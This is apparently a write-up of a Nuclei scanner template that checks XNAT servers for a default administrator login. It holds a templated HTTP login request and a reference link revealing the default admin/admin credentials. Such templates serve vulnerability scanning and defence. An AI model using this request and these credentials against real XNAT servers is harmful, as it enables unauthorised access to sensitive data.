# Nuclei Template: XNAT - Default Login
**Template ID:** xnat-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`xnat-default-login.yaml`)

## Vulnerability Information & PoC

## Description
XNAT contains an admin default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=
```

## References
- https://wiki.xnat.org/documentation/xnat-administration/xnat-setup-first-time-configuration#:~:text=Log%20in%20with%20the%20username%20admin%20and%20password%20admin
